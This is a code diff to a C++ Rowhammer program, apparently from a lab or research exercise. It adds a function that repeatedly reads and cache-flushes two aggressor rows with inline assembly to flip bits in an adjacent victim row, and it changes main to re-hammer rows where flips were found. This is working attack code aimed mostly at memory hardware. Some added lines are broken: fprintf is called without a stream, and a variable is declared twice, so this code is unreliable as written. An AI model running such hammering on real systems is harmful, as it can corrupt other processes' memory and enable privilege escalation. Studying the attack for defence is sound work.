@@ -130,6 +130,45 @@ void verify_same_bank(uint64_t samples, uint64_t bank_no) {
 
 }
 
+uint32_t hammer_addresses_old(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
+
+    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
+    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
+    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
+    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
+    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
+    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
+    
+    clflush_row(vict_virt_addr_ptr);
+    clflush_row(attacker_virt_addr_1_ptr);
+    clflush_row(attacker_virt_addr_2_ptr);
+  
+    int num_reads = HAMMERS_PER_ITER;
+
+    while (num_reads-- > 0 ) {
+        asm volatile(
+            "mov (%0), %%rax\n\t"
+            "mov (%1), %%rax\n\t"
+            "clflush (%0)\n\t"
+            "clflush (%1)\n\t"
+            "mfence\n\t"
+            :
+            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
+            : "rax"
+        );
+    }
+
+    clflush_row(vict_virt_addr_ptr);
+
+    uint32_t number_of_bitflips_in_target = 0;
+    for (uint32_t index = 0; index < ROW_SIZE; index++) {
+        if (vict_virt_addr_ptr[index] != 0x55) {
+            number_of_bitflips_in_target++;
+        }
+    }
+    return number_of_bitflips_in_target; 
+}
+
 uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
 
     uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
@@ -231,8 +270,17 @@ int main(int argc, char **argv) {
         // row + 1, row - 1
         if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
             uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
-            print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
+            //print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
             //if (num_bit_flips > 0) break;
+            if (num_bit_flips > 0) {
+                print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
+                fprintf("Bit Flips Found. Reproducing Bit Flips.\n");
+                uint32_t num_bit_flips2 = hammer_addresses(victim, *attacker_1, *attacker_2);
+                print_result(victim, *attacker_1, *attacker_2, num_bit_flips2);
+                fprintf("Try again? Reproducing Bit Flips.\n");
+                uint32_t num_bit_flips2 = hammer_addresses(victim, *attacker_1, *attacker_2);
+                print_result(victim, *attacker_1, *attacker_2, num_bit_flips2);
+            }
         }
     }
 
@@ -241,7 +289,16 @@ int main(int argc, char **argv) {
         // row + 2, row - 2
         if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 2)) {
             uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
-            print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
+            if (num_bit_flips > 0) {
+                print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
+                fprintf("Bit Flips Found. Reproducing Bit Flips.\n");
+                uint32_t num_bit_flips2 = hammer_addresses(victim, *attacker_1, *attacker_2);
+                print_result(victim, *attacker_1, *attacker_2, num_bit_flips2);
+                fprintf("Try again? Reproducing Bit Flips.\n");
+                uint32_t num_bit_flips2 = hammer_addresses(victim, *attacker_1, *attacker_2);
+                print_result(victim, *attacker_1, *attacker_2, num_bit_flips2);
+
+            }
             //if (num_bit_flips > 0) break;
         }
     }
